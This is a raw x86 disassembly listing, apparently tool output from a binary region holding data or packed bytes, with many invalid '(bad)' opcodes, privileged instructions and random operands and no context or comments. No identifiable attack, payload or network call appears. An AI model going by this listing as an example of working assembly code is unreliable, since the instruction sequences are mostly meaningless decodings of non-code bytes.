  4953ae:	inc    esi
  4953af:	inc    esp
  4953b0:	ja     0x495367
  4953b2:	call   FWORD PTR [edi]
  4953b4:	ds inc ecx
  4953b7:	sbb    BYTE PTR [ebx+ecx*1-0x1],cl
  4953bb:	lsl    eax,WORD PTR [ebx]
  4953be:	arpl   WORD PTR [edi+eiz*4-0xe1cd11a],si
  4953c5:	mov    al,0xc2
  4953c7:	(bad)  
  4953c8:	push   ss
  4953c9:	xchg   edi,eax
  4953ca:	push   ds
  4953cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4953cc:	hlt    
  4953cd:	int3   
  4953ce:	idiv   BYTE PTR [edi]
  4953d0:	mov    es,WORD PTR [eax]
  4953d2:	dec    DWORD PTR [eax+0x454caf27]
  4953d8:	lock pop eax
  4953da:	fdivp  st(7),st
  4953dc:	pop    es
  4953dd:	fsub   DWORD PTR [ecx]
  4953df:	or     eax,0x999b9cde
  4953e4:	(bad)  
  4953e5:	(bad)  
  4953e6:	(bad)  
  4953e7:	jbe    0x4953ec
  4953e9:	mov    eax,ds:0x752f67c0
  4953ee:	inc    edx
  4953ef:	sub    ebx,DWORD PTR [esi+eiz*8+0x5a6dbfde]
  4953f6:	test   BYTE PTR [edi-0x74f808e1],cl
  4953fc:	ret    
  4953fd:	sbb    BYTE PTR [ecx+0x7],dh
  495400:	(bad)  
  495401:	mov    cl,0x61
  495403:	add    al,0x6b
  495405:	pop    es
  495406:	inc    DWORD PTR [edi+0x56]
  495409:	or     DWORD PTR [edi],ecx
  49540b:	ja     0x4953b4
  49540d:	outs   dx,DWORD PTR es:[esi]
  49540f:	daa    
  495410:	jbe    0x49545c
  495412:	stos   DWORD PTR es:[edi],eax
  495413:	push   es
  495414:	aaa    
  495415:	(bad)  
  495416:	loopne 0x49546e
  495418:	inc    edx
  495419:	or     edi,edi
  49541b:	jg     0x495424
  49541d:	push   ss
  49541e:	je     0x49543c
  495420:	inc    ebp
  495421:	call   FWORD PTR [ebp+0x71f7c700]
  495427:	outs   dx,DWORD PTR ds:[esi]
  495428:	mov    bl,0x6
  49542a:	sysret 
  49542c:	pop    ds
  49542d:	cs cs loope 0x49541c
  495431:	cmc    
  495432:	das    
  495433:	push   ss
  495434:	cmova  ebx,DWORD PTR [eax+0x1db1936]
  49543b:	jg     0x495444
  49543d:	xor    BYTE PTR [eax],bh
  49543f:	sbb    BYTE PTR [esi+ebx*1-0x24fdb171],cl
  495446:	cmp    dh,BYTE PTR [eax+0x5f]
  495449:	jg     0x495462
  49544b:	lock pop eax
  49544d:	or     al,0x38
  49544f:	out    0xcf,eax
  495451:	push   ss
  495452:	rcr    DWORD PTR [eax],0xd7
  495455:	cmp    ah,BYTE PTR [edi]
  495457:	jg     0x495480
  495459:	fcomp  QWORD PTR [ebx-0x50]
  49545c:	xlat   BYTE PTR ds:[ebx]
  49545d:	imul   DWORD PTR [edi-0x62]
  495460:	push   ds
  495461:	push   cs
  495462:	sub    bh,BYTE PTR [eax+0x1]
  495465:	jle    0x495466
  495467:	sahf   
  495468:	jmp    0x6459ed
  49546d:	(bad)  
  49546e:	lods   eax,DWORD PTR ds:[esi]
  49546f:	test   esi,0x6adc31a6
  495475:	(bad)  
  495476:	push   ss
  495477:	pop    es
  495478:	pop    es
  495479:	mov    ah,0xf6
  49547b:	icebp  
  49547c:	rcl    BYTE PTR [esi],0xef
  49547f:	add    DWORD PTR [esi+0x61],esi
  495482:	mov    ds:0x7072771,eax
  495487:	fld    TBYTE PTR [ebx*1-0x28d00974]
  49548e:	add    DWORD PTR [ecx+0x5f042302],esi
  495494:	xor    BYTE PTR [esi],al
  495496:	stos   DWORD PTR es:[edi],eax
  495497:	loopne 0x4954c8
  495499:	mov    bh,0xd6
  49549b:	mov    al,0x60
  49549d:	or     al,0xeb
  49549f:	ja     0x495510
  4954a1:	(bad)  
  4954a2:	aas    
  4954a3:	mov    al,ds:0xff3f3760
  4954a8:	lahf   
  4954a9:	sahf   
  4954aa:	pushf  
  4954ab:	(bad)  
  4954ac:	popa   
  4954ad:	cmp    BYTE PTR [ecx+0x5],ah
  4954b0:	div    edi
  4954b2:	rcr    BYTE PTR [edx+0x2e67db84],0x37
  4954b9:	pop    eax
  4954ba:	pop    eax
  4954bb:	add    eax,0x6d70ef1
  4954c0:	inc    edi
  4954c1:	fwait
  4954c2:	mov    al,0xd7
  4954c4:	maskmovq mm3,(bad)
  4954c5:	neg    DWORD PTR [esi]
  4954c7:	and    edx,ebx
  4954c9:	loop   0x49545b
  4954cb:	out    0x1,al
  4954cd:	jg     0xdf906e08
  4954d3:	ds mov al,0x20
  4954d6:	adc    al,0x9
  4954d8:	aaa    
  4954d9:	inc    ebx
  4954db:	push   edi
  4954dc:	adc    al,0x9c
  4954de:	push   es
  4954df:	inc    DWORD PTR [esi]
  4954e1:	or     esp,DWORD PTR [eax+0xa421600]
  4954e7:	inc    ecx
  4954e8:	(bad)  
  4954e9:	hlt    
  4954ea:	out    0x96,eax
  4954ec:	(bad)  
  4954ed:	fs ins BYTE PTR es:[edi],dx
  4954ef:	mov    al,ds:0x1ef66fc7
  4954f4:	pop    edi
  4954f5:	fwait
  4954f6:	pop    es
  4954f7:	pop    es
  4954f8:	push   ds
  4954f9:	inc    DWORD PTR [ecx]
  4954fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4954fc:	rol    DWORD PTR [ebp+0x5ef7f219],1
  495502:	sub    ebx,DWORD PTR [edx]
  495504:	adc    al,0x3c
  495506:	mul    BYTE PTR [edi+0x73bdc36f]
  49550c:	dec    edi
  49550d:	daa    
  49550e:	pop    es
  49550f:	jle    0x495538
  495511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495512:	and    DWORD PTR [si+0x11aa],eax
  495517:	push   DWORD PTR [ebx-0x78]
  49551a:	adc    ch,0x3f
  49551d:	jmp    DWORD PTR [ecx-0x3ee79460]
  495523:	or     ch,bh
  495525:	inc    DWORD PTR [edi]
  495527:	ss sahf 
  495529:	push   esi
  49552a:	or     DWORD PTR [edi],esi
  49552c:	pop    es
  49552d:	or     al,BYTE PTR [ebp-0x2c]
  495530:	ins    DWORD PTR es:[edi],dx
  495531:	jg     0x495511
  495533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495534:	and    al,0x6
  495536:	stos   DWORD PTR es:[edi],eax
  495537:	mov    bh,ah
  495539:	dec    esi
  49553a:	pop    edx
  49553b:	inc    eax
  49553c:	cmp    al,0xed
  49553e:	mul    DWORD PTR [edi]
  495540:	iret   
  495541:	fwait
  495542:	mov    cl,0xad
  495544:	add    edi,DWORD PTR [edi-0x3e4398f9]
  49554a:	add    DWORD PTR [edi-0x19],eax
  49554d:	scas   al,BYTE PTR es:[edi]
  49554e:	mov    esi,0x482223b7
  495553:	sub    BYTE PTR [edi],dh
  495555:	jmp    DWORD PTR [ebx]
  495557:	arpl   WORD PTR [edx-0x10],dx
  49555a:	mov    ds:0xf6c79fa1,al
  49555f:	mov    bl,0xe7
  495561:	pop    esp
  495562:	jmp    0x495596
  495564:	mov    dh,0x7
  495566:	out    dx,eax
  495567:	pop    es
  495568:	push   eax
  495569:	mov    ah,0xc0
  49556b:	imul   eax,DWORD PTR [esi],0xc077bfce
  495571:	leave  
  495572:	pusha  
  495573:	outs   dx,DWORD PTR ds:[esi]
  495574:	push   cs
  495575:	push   es
  495576:	push   edi
  495577:	vcvtsi2ss xmm1,xmm7,DWORD PTR [eax+0x11159fef]
  49557f:	sub    ecx,DWORD PTR [eax+0x7b87ff7]
  495585:	jbe    0x4955e7
  495587:	(bad)  
  495588:	jle    0x495518
  49558a:	sbb    al,0x11
  49558c:	ror    DWORD PTR [ecx-0x4a],0xff
  495590:	mov    ds:0x341498c9,eax
  495595:	add    bh,al
  495597:	div    BYTE PTR [ebp+ebx*2+0x67e32ac4]
  49559e:	out    0xcf,eax
  4955a0:	xchg   dl,al
  4955a2:	sub    ah,BYTE PTR [ebx-0x11]
  4955a5:	out    dx,al
  4955a6:	jo     0x495558
  4955a8:	or     cl,BYTE PTR [edi+eiz*1]
  4955ab:	dec    DWORD PTR [edi-0x40]
  4955ae:	push   es
  4955af:	or     eax,0x2f7e6f0c
  4955b4:	lds    esp,FWORD PTR [ecx+edx*2+0x37ff2ef0]
  4955bb:	adc    ebx,DWORD PTR [ebx+0x72f8eb4]
  4955c1:	push   es
  4955c2:	bsf    edx,DWORD PTR [ebp+0x17]
  4955c6:	pop    ds
  4955c7:	push   ss
  4955c8:	test   BYTE PTR [edx],0xf3
  4955cb:	sub    BYTE PTR [eax],cl
  4955cd:	jmp    DWORD PTR [ebx+eiz*4+0xc1b1af7]
  4955d4:	mov    ch,0x9f
  4955d6:	pop    es
  4955d7:	cmp    ebx,DWORD PTR [edx]
  4955d9:	mov    ebp,0x3e0f6f55
  4955de:	xlat   BYTE PTR ds:[ebx]
  4955df:	add    DWORD PTR [edx-0xbff3372],esp
  4955e5:	(bad)  
  4955e6:	sub    ebx,eax
  4955e8:	sub    eax,0xffff07ec
  4955ed:	inc    edx
  4955ee:	stos   DWORD PTR es:[edi],eax
  4955ef:	loopne 0x495642
  4955f1:	pop    es
  4955f2:	push   DWORD PTR [eax-0x58ca9cf2]
  4955f8:	pop    ds
  4955f9:	dec    edx
  4955fa:	arpl   WORD PTR [edi-0x4850f81f],dx
  495600:	add    ecx,DWORD PTR [edx]
  495602:	add    ecx,eax
  495604:	push   DWORD PTR [edi-0x4f]
  495607:	shl    BYTE PTR [eax-0x828382a],0xbf
  49560e:	pcmpgtd mm5,mm1
  495611:	push   cs
  495612:	ss daa 
  495614:	xchg   edi,eax
  495615:	scas   al,BYTE PTR es:[edi]
  495616:	scas   eax,DWORD PTR es:[edi]
  495617:	inc    ebp
  495618:	les    eax,FWORD PTR [eax]
  49561a:	mov    eax,ds:0x9d885ffe
  49561f:	fisubr DWORD PTR [eax+0x18c2171f]
  495625:	adc    al,0xbc
  495627:	outs   dx,BYTE PTR ds:[esi]
  495628:	call   DWORD PTR [esi]
  49562a:	mov    esp,0xfe1782c1
  49562f:	ja     0x495630
  495631:	or     BYTE PTR [edx-0x1c8e87b],al
  495637:	dec    DWORD PTR [edx+0x2d]
  49563a:	push   0xc700a638
  49563f:	neg    DWORD PTR [edi-0x3a3a6e58]
  495645:	ja     0x49566e
  495647:	xchg   esi,eax
  495648:	xchg   edi,eax
  495649:	jno    0x4955fb
  49564b:	or     cl,BYTE PTR [edi+0x2ce73707]
  495651:	xor    ebp,DWORD PTR [ecx+eax*1-0x12]
  495655:	pop    es
  495656:	jle    0x495619
  495658:	cmp    dh,BYTE PTR [ecx-0x68c8e8a7]
  49565e:	(bad)  
  49565f:	test   al,0x69
  495661:	aad    0xb7
  495663:	pop    es
  495664:	sbb    BYTE PTR ds:0x463f60b0,bl
  49566a:	test   BYTE PTR ds:0xff20290d,0x0
  495671:	or     ebx,DWORD PTR [esp+edi*4+0x36]
  495675:	pusha  
  495676:	add    DWORD PTR [ebx-0x8c1283b],eax
  49567c:	pop    es
  49567d:	fld    TBYTE PTR [edx]
  49567f:	sub    BYTE PTR [edi+0x1],0xe7
  495683:	mov    cl,0xbd
  495685:	pop    es
  495686:	push   es
  495687:	push   esi
  495688:	cs out 0x47,eax
  49568b:	shl    DWORD PTR [edx+0x63],cl
  49568e:	lock aas 
  495690:	inc    esi
  495691:	pop    es
  495692:	pop    es
  495693:	call   0x2007:0xf146032
  49569a:	pop    eax
  49569b:	dec    ebp
  49569c:	or     eax,0x546ffe7
  4956a1:	int    0x21
  4956a3:	pop    es
  4956a4:	pop    es
  4956a5:	(bad)  
  4956a6:	ds ret 
  4956a8:	ja     0x4956c6
  4956aa:	lods   al,BYTE PTR ds:[esi]
  4956ab:	cs push ss
  4956ad:	(bad)  
  4956ae:	xchg   DWORD PTR [esi-0x29108f69],ecx
  4956b4:	inc    esp
  4956b5:	ja     0x4956c5
  4956b7:	fistp  QWORD PTR [esi+0x182f48b]
  4956bd:	xlat   BYTE PTR ds:[ebx]
  4956be:	push   ds
  4956bf:	pop    es
  4956c0:	dec    ebp
  4956c1:	pop    edi
  4956c2:	mov    bh,0x8
  4956c4:	inc    edi
  4956c5:	inc    esi
  4956c6:	aas    
  4956c7:	pop    es
  4956c8:	adc    BYTE PTR [eax],cl
  4956ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4956cb:	cmp    edi,0x7
  4956ce:	add    al,BYTE PTR [edx+0x4f07d83b]
  4956d4:	out    0xff,al
  4956d6:	sub    al,0x46
  4956d8:	push   eax
  4956d9:	xor    ah,bh
  4956db:	(bad)  
  4956dc:	push   edi
  4956de:	fadd   QWORD PTR [esi]
  4956e0:	sub    al,0xb0
  4956e2:	xchg   edi,eax
  4956e3:	xlat   BYTE PTR ds:[ebx]
  4956e4:	push   ds
  4956e5:	sub    ecx,DWORD PTR [ecx-0x23f1dd5d]
  4956eb:	lahf   
  4956ec:	xlat   BYTE PTR ds:[ebx]
  4956ed:	scas   al,BYTE PTR es:[edi]
  4956ee:	add    edx,DWORD PTR [esi]
  4956f0:	adc    ebx,DWORD PTR [edi+0x3e]
  4956f3:	das    
  4956f4:	add    BYTE PTR [esp+edi*1-0x7f71d050],bl
  4956fb:	shr    DWORD PTR [eax-0x26],0x27
  4956ff:	pop    es
  495700:	lahf   
  495701:	add    BYTE PTR [esi],al
  495703:	xor    al,0xe5
  495705:	sysret 
  495707:	pop    ds
  495708:	add    al,BYTE PTR [edx+0x6ffaf15]
  49570e:	pop    es
  49570f:	or     BYTE PTR [ebx],cl
  495711:	inc    edx
  495712:	or     ebp,DWORD PTR [ecx-0x3aa9437e]
  495718:	dec    DWORD PTR [edx-0x1d]
  49571b:	jmp    0x1f57f696
  495720:	pop    ss
  495721:	sbb    ah,BYTE PTR [ecx-0x70002fbb]
  495727:	adc    BYTE PTR [edi],al
  495729:	ins    DWORD PTR es:[edi],dx
  49572a:	ret    0xfe1f
  49572d:	in     eax,dx
  49572e:	pop    edx
  49572f:	dec    ecx
  495730:	lods   al,BYTE PTR ds:[esi]
  495731:	fistp  QWORD PTR [edi]
  495733:	pop    es
  495734:	(bad)  
  495735:	loope  0x49573d
  495737:	xor    eax,0x10074f07
  49573c:	sbb    al,0xec
  49573e:	nop
  49573f:	dec    edi
  495740:	idiv   edi
  495742:	sub    al,dh
  495744:	iret   
  495745:	add    BYTE PTR [ebx+eiz*4],al
  495748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495749:	test   al,0xc7
  49574b:	mov    edx,0x5805a3e6
  495750:	add    DWORD PTR [edi+0x585d8f87],ebx
  495756:	dec    eax
  495757:	mov    eax,0xf417cf07
  49575c:	(bad)  
  49575d:	ror    DWORD PTR [esi-0x29e1f8f9],cl
  495763:	fs mov al,0xb8
  495766:	daa    
  495767:	addr16 pop es
  495769:	inc    esi
  49576a:	add    al,0x9b
  49576c:	push   cs
  49576d:	inc    DWORD PTR [edi]
  49576f:	call   DWORD PTR [eax+0x7]
  495772:	outs   dx,BYTE PTR ds:[esi]
  495773:	and    edx,DWORD PTR [edi]
  495775:	xchg   esi,eax
  495776:	invd   
  495778:	push   ds
  495779:	inc    edi
  49577a:	xchg   DWORD PTR [esi],eax
  49577c:	dec    edi
  49577d:	out    dx,al
  49577e:	push   DWORD PTR [esi]
  495780:	dec    esi
  495781:	repz add BYTE PTR [edx+0x1636b9a6],ah
  495788:	sbb    DWORD PTR [ebx-0x4be408a1],ebp
  49578e:	adc    ebp,ebx
  495790:	out    dx,eax
  495791:	pop    ds
  495792:	daa    
  495793:	jbe    0x4957ee
  495795:	mov    esp,0xef6f075d
  49579a:	pop    es
  49579b:	sbb    BYTE PTR [ecx],dh
  49579d:	popf   
  49579e:	add    eax,DWORD PTR [edi-0x3aa5f8da]
  4957a4:	mov    BYTE PTR ds:0x5011170f,bl
  4957aa:	sbb    al,0x6c
  4957ac:	pop    es
  4957ad:	xlat   BYTE PTR ds:[ebx]
  4957ae:	inc    esi
  4957b0:	pusha  
  4957b1:	daa    
  4957b2:	icebp  
  4957b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4957b4:	test   eax,0xb1ee17c7
  4957b9:	fwait
  4957ba:	pop    eax
  4957bb:	aad    0xe7
  4957bd:	xlat   BYTE PTR ds:[ebx]
  4957be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4957bf:	fstp   QWORD PTR [eax-0x69]
  4957c2:	addr16 daa 
  4957c4:	pop    ds
  4957c5:	or     ah,BYTE PTR [ebx+0x21]
  4957c8:	sub    bh,0xef
  4957cb:	xor    DWORD PTR [eax+0x77fc369],esp
  4957d1:	ror    BYTE PTR [edx],cl
  4957d3:	je     0x4957b5
  4957d5:	push   es
  4957d6:	lldt   WORD PTR [eax]
  4957d9:	sub    al,0xb1
  4957db:	femms  
  4957dd:	call   DWORD PTR [esi]
  4957df:	inc    ebx
  4957e0:	sub    cl,dh
  4957e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4957e3:	idiv   BYTE PTR [edx-0x27459e9a]
  4957e9:	hlt    
  4957ea:	pop    es
  4957eb:	seta   BYTE PTR [edi]
  4957ee:	mov    ah,0xeb
  4957f0:	imul   ebx,DWORD PTR [ebp+0x7],0xbe320707
  4957f7:	push   ss
  4957f8:	mov    esp,0x1407ff26
  4957fd:	lods   al,BYTE PTR ds:[esi]
  4957fe:	push   cs
  4957ff:	in     al,dx
  495800:	test   DWORD PTR [edi],0x36ec64ff
  495806:	inc    esi
  495807:	scas   eax,DWORD PTR es:[edi]
  495808:	adc    BYTE PTR [ebx],0x46
  49580b:	pop    eax
  49580c:	lahf   
  49580d:	push   esi
  49580e:	push   ss
  49580f:	push   DWORD PTR [eax+ebp*2-0x550357ab]
  495816:	(bad)  
  495817:	pop    edi
  495818:	shl    eax,0x58
  49581b:	add    ebx,DWORD PTR [edi+0x7]
  49581e:	(bad)  
  49581f:	jmp    0x4957fb
  495821:	mov    WORD PTR [edi-0x53f8e0f9],fs
  495827:	rol    cl,1
  495829:	inc    ecx
  49582a:	es mov edi,0xdc0cd6ff
  495830:	pcmpgtd mm6,QWORD PTR es:[edi]
  495834:	lods   eax,DWORD PTR ds:[esi]
  495835:	call   0x6e4e:0x70f0742
  49583c:	jne    0x495821
  49583e:	das    
  49583f:	pop    ds
  495840:	xchg   edi,eax
  495841:	into   
  495842:	(bad)  
  495843:	test   al,0x82
  495845:	adc    DWORD PTR [esi],esi
  495847:	jmp    DWORD PTR [esi-0x42385456]
  49584d:	inc    esi
  49584e:	sub    edx,DWORD PTR [ebx+ecx*4-0x9]
  495852:	pop    edi
  495853:	iret   
  495854:	je     0x495863
  495856:	inc    edx
  495857:	rol    DWORD PTR [edi],cl
  495859:	inc    BYTE PTR [edi]
  49585b:	ret    0xc3d7
  49585e:	(bad)  
  49585f:	call   FWORD PTR [esi]
  495861:	pop    es
  495862:	inc    ebx
  495863:	pop    es
  495864:	push   es
  495865:	imul   ecx,DWORD PTR [edi],0xfffffffe
  495868:	bswap  eax
  49586a:	fiadd  WORD PTR [edx-0x373736c0]
  495870:	call   DWORD PTR [edi-0x1d7ff03b]
  495876:	notrack jmp DWORD PTR [edi-0x8385356]
  49587d:	xor    DWORD PTR [ebp+0x38],ebp
  495880:	pop    eax
  495881:	push   edi
  495882:	pop    es
  495883:	pop    es
  495884:	cs sbb eax,0xe707aeac
  49588a:	das    
  49588b:	cmp    al,BYTE PTR [eax]
  49588d:	mov    esp,0x1a0f7eb0
  495892:	xlat   BYTE PTR ds:[ebx]
  495893:	call   0x6274:0x7077fdc
  49589a:	je     0x495908
  49589c:	pop    es
  49589d:	pop    es
  49589e:	pop    ss
  49589f:	cmp    BYTE PTR [ebp-0x69c8a5f5],ch
  4958a5:	js     0x495851
  4958a7:	sbb    BYTE PTR ds:0xadabff0f,0xc7
  4958ae:	pop    ebx
  4958af:	ins    BYTE PTR es:[edi],dx
  4958b0:	lods   eax,DWORD PTR ds:[esi]
  4958b1:	xor    BYTE PTR [edi+0x4f],al
  4958b4:	(bad)  
  4958b5:	pop    ss
  4958b6:	sbb    BYTE PTR [ebp-0x63],dh
  4958b9:	(bad)  
  4958ba:	pop    ds
  4958bb:	ss pop es
  4958bd:	push   edi
  4958be:	fidiv  DWORD PTR ds:0x74eff30
  4958c4:	dec    DWORD PTR [ebx]
  4958c6:	inc    edx
  4958c7:	xchg   DWORD PTR [eax+0x1e],esi
  4958ca:	aas    
  4958cb:	outs   dx,DWORD PTR ds:[esi]
  4958cc:	inc    eax
  4958cd:	and    esi,DWORD PTR [ebx+eax*1-0x7d4fd8f1]
  4958d4:	aad    0x81
  4958d6:	ud0    ebp,DWORD PTR [eax-0x600ff87e]
  4958dd:	push   esi
  4958de:	inc    DWORD PTR [ecx+0x6f]
  4958e1:	lds    esp,FWORD PTR [eax+ebp*4-0x9]
  4958e5:	scas   eax,DWORD PTR es:[edi]
  4958e6:	inc    esi
  4958e7:	pop    ebp
  4958e8:	cmp    edx,DWORD PTR [esi]
  4958ea:	out    0x7,eax
  4958ec:	pop    es
  4958ed:	dec    ebp
  4958ee:	sbb    BYTE PTR [ecx-0x69],ah
  4958f1:	das    
  4958f2:	cvtps2pd xmm0,QWORD PTR es:[ebx+0x1faf6076]
  4958fa:	mov    bh,0xa6
  4958fc:	add    eax,0x8707274d
  495901:	push   ebp
  495902:	ror    DWORD PTR [ecx],0xb8
  495905:	sahf   
  495906:	into   
  495907:	call   FWORD PTR [edx]
  495909:	add    DWORD PTR [esi],edx
  49590b:	cmp    eax,0xf7c7aeac
  495910:	dec    edi
  495911:	pop    ebp
  495912:	pop    eax
  495913:	lods   al,BYTE PTR ds:[esi]
  495914:	or     DWORD PTR [edi+0x76],esp
  495917:	shrd   DWORD PTR [ecx],edx,0x7a
  49591b:	pop    edx
  49591c:	pop    es
  49591d:	inc    ecx
  49591f:	or     al,0xbb
  495921:	cmp    dl,BYTE PTR [esi]
  495923:	out    dx,eax
  495924:	add    eax,esi
  495926:	adc    eax,DWORD PTR [edx+0x23]
  495929:	jbe    0x4958b2
  49592b:	pop    ss
  49592c:	emms   
  49592e:	mov    al,0x60
  495930:	inc    ebp
  495931:	call   DWORD PTR [edi-0x72]
  495934:	es stos BYTE PTR es:[edi],al
  495936:	pop    eax
  495937:	add    dh,bh
  495939:	jmp    FWORD PTR [ecx+ecx*1-0x99eade6]
  495940:	shl    BYTE PTR ds:0xdfb0e743,0x7
  495947:	(bad)  
  495948:	ja     0x495910
  49594a:	adc    DWORD PTR [ebx-0x5ae9f852],eax
  495950:	rcr    DWORD PTR [edx-0x29f8718b],1
  495956:	adc    eax,0xf27d581
  49595c:	jne    0x495968
  49595e:	outs   dx,BYTE PTR ds:[esi]
  49595f:	lds    edx,FWORD PTR [edi]
  495961:	packuswb mm5,QWORD PTR [ebx+0x2c]
  495965:	fmul   DWORD PTR [edi+ecx*1+0x2a0c5637]
  49596c:	jp     0x49596f
  49596e:	outs   dx,BYTE PTR ds:[esi]
  49596f:	(bad)  
  495970:	fidiv  DWORD PTR [edx+eax*4]
  495973:	push   ebp
  495974:	idiv   edi
  495976:	mov    DWORD PTR [ebp-0x8e6539a],0x84e1e917
  495980:	jne    0x495989
  495982:	jle    0x35cde68e
  495988:	addr16 xchg esi,eax
  49598a:	pop    ds
  49598b:	mov    ebp,DWORD PTR [eax-0x18f82cef]
  495991:	sbb    BYTE PTR [ebx+0x71],ch
  495994:	add    ebx,DWORD PTR [edi-0x22]
  495997:	sbb    al,BYTE PTR ds:0x879e3787
  49599d:	push   cs
  49599e:	inc    DWORD PTR [ecx+0x5]
  4959a1:	mov    bh,0x51
  4959a3:	push   edi
  4959a4:	notrack call DWORD PTR [eax]
  4959a7:	push   esi
  4959a8:	je     0x49592b
  4959aa:	inc    dl
  4959ac:	aaa    
  4959ad:	mov    edx,0xa7ac6dd6
  4959b2:	addr16 pop es
  4959b4:	sbb    eax,0xffac5c7a
  4959b9:	push   ss
  4959ba:	pop    ds
  4959bb:	mov    bh,0x61
  4959bd:	popf   
  4959be:	or     BYTE PTR [edi+0x4ab4b7cf],dh
  4959c4:	and    ebp,DWORD PTR [ebx-0x75609189]
  4959ca:	mov    edx,0x368f1310
  4959cf:	call   0x8ffacbb5
  4959d4:	xlat   BYTE PTR ds:[ebx]
  4959d5:	(bad)  
  4959d6:	ja     0x4959df
  4959d8:	adc    eax,0x16972add
  4959dd:	jmp    DWORD PTR [ebp-0x34fa7728]
  4959e3:	test   eax,0xb5bfffab
  4959e8:	call   0x6a0f:0xceff2370
  4959ef:	lock test ch,dl
  4959f2:	pop    es
  4959f3:	cmovbe ebx,ebx
  4959f6:	add    DWORD PTR [edi+0xf7f5735],0x83015496
  495a00:	sub    edi,0xffffff96
  495a03:	(bad)  
  495a05:	mov    dl,BYTE PTR [ebx]
  495a07:	or     BYTE PTR [edi],bh
  495a09:	cli    
  495a0a:	cli    
  495a0b:	cli    
  495a0c:	js     0x4959ca
  495a0e:	rol    edi,0x57
  495a11:	idiv   BYTE PTR [edi+0x10ccb056]
  495a17:	xchg   ebp,eax
  495a18:	jmp    DWORD PTR [edx+ecx*8-0x7892f73a]
  495a1f:	pop    edi
  495a20:	pop    es
  495a21:	shr    DWORD PTR [edx+0xf076b0b],cl
  495a27:	pop    es
  495a28:	mov    edx,0xa6d589d8
  495a2d:	pop    ss
  495a2e:	ja     0x495a5e
  495a30:	push   0xfffffff0
  495a32:	xor    DWORD PTR [esi+0x6f],ebp
  495a35:	push   esi
  495a36:	mov    bh,0x80
  495a38:	push   eax
  495a39:	popf   
  495a3a:	shr    BYTE PTR [edi],0x6c
  495a3d:	push   ss
  495a3e:	push   cs
  495a3f:	sub    edi,edi
  495a41:	mov    fs,WORD PTR [edi+0x6aa045a2]
  495a47:	(bad)  
  495a48:	mov    esi,0x3a10abf7
  495a4d:	les    edi,FWORD PTR [edi]
  495a4f:	addr16 mov esp,0xf0baad3
  495a55:	push   es
  495a56:	aaa    
  495a57:	ins    BYTE PTR es:[edi],dx
  495a58:	mov    al,0x56
  495a5a:	or     eax,0x2a8cff5f
  495a5f:	mov    BYTE PTR [edi+ebx*8-0x1],bl
  495a63:	adc    eax,0xff204016
  495a68:	(bad)  
  495a69:	sub    BYTE PTR [eax-0x73],bl
  495a6c:	repz mov ds:0xff3fa9a6,eax
  495a72:	arpl   WORD PTR [ebx],dx
  495a74:	inc    edx
  495a75:	xlat   BYTE PTR ds:[ebx]
  495a76:	pop    es
  495a77:	packssdw mm0,QWORD PTR [edx+0xf17305b]
  495a7e:	movups xmm0,XMMWORD PTR ds:0xf78f5bab
  495a85:	inc    esi
  495a86:	add    ch,BYTE PTR [ebx]
  495a88:	xor    bh,0x57
  495a8b:	or     eax,0xc6c27055
  495a90:	jmp    DWORD PTR [edx+0x421ad0cd]
  495a96:	(bad)  
  495a97:	(bad)  
  495a98:	fistp  QWORD PTR [edx]
  495a9a:	or     eax,0xff076d82
  495a9f:	inc    esi
  495aa0:	loopne 0x495b02
  495aa2:	xor    dl,ch
  495aa4:	pop    es
  495aa5:	call   FWORD PTR [esi]
  495aa7:	stos   BYTE PTR es:[edi],al
  495aa8:	xor    BYTE PTR [edi-0x8fec09a],0x8
  495aaf:	or     eax,0xfef7d146
  495ab4:	ror    DWORD PTR [edx-0x411ebe],0xfe
  495abb:	add    BYTE PTR [ebp-0x5ef9b2b4],0x0
  495ac2:	push   DWORD PTR [ebp+0x61]
  495ac5:	inc    esp
  495ac6:	xor    DWORD PTR [esi],esi
  495ac8:	dec    DWORD PTR [edi]
  495aca:	mov    ds:0xf76862b0,eax
  495acf:	pop    edi
  495ad0:	faddp  st(0),st
  495ad2:	retf   0x4f61
  495ad5:	(bad)  
  495ad6:	push   ss
  495ad7:	sub    bl,dh
  495ad9:	or     BYTE PTR [eax],cl
  495adb:	out    0x7,eax
  495add:	idiv   DWORD PTR [eax]
  495adf:	imul   ebx,DWORD PTR [ebp-0x3e],0xbd4a0667
  495ae6:	mov    ds:0x605ff58,al
  495aeb:	inc    BYTE PTR [eax]
  495aed:	stos   DWORD PTR es:[edi],eax
  495aee:	scas   al,BYTE PTR es:[edi]
  495aef:	into   
  495af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495af2:	(bad)  
  495af3:	inc    DWORD PTR [ebx]
  495af5:	adc    BYTE PTR ds:0xffffff83,0x81
  495afc:	cmp    al,0x56
  495afe:	push   ebx
  495aff:	(bad)  
  495b00:	ja     0x495b00
  495b02:	add    esp,DWORD PTR [eax-0x47]
  495b05:	test   eax,0x60b10797
  495b0a:	xor    DWORD PTR [ebx-0x39],eax
  495b0d:	test   eax,0xf74622ed
  495b13:	pmaxsw mm0,QWORD PTR [eax]
  495b16:	sbb    al,0x50
  495b18:	lock out 0xff,al
  495b1b:	pop    es
  495b1c:	adc    ebx,DWORD PTR [eax+0x28]
  495b1f:	jge    0x495b1f
  495b21:	mov    esp,0x15dfc5bd
  495b26:	and    BYTE PTR [eax-0x54],dl
  495b29:	xlat   BYTE PTR ds:[ebx]
  495b2a:	idiv   edi
  495b2c:	xchg   esi,eax
  495b2d:	clc    
  495b2e:	fisubr DWORD PTR [ebp-0x3fb1e0d1]
  495b34:	push   ss
  495b35:	pop    esp
  495b36:	cmp    eax,0x74f1ffe
  495b3b:	(bad)  
  495b3c:	or     eax,0xa7de460d
  495b41:	ror    DWORD PTR [edx-0x53],1
  495b44:	xchg   BYTE PTR [edi-0x11],al
  495b47:	imul   DWORD PTR [eax+ecx*4-0x92a78]
  495b4e:	cmp    cl,BYTE PTR [eax]
  495b50:	inc    eax
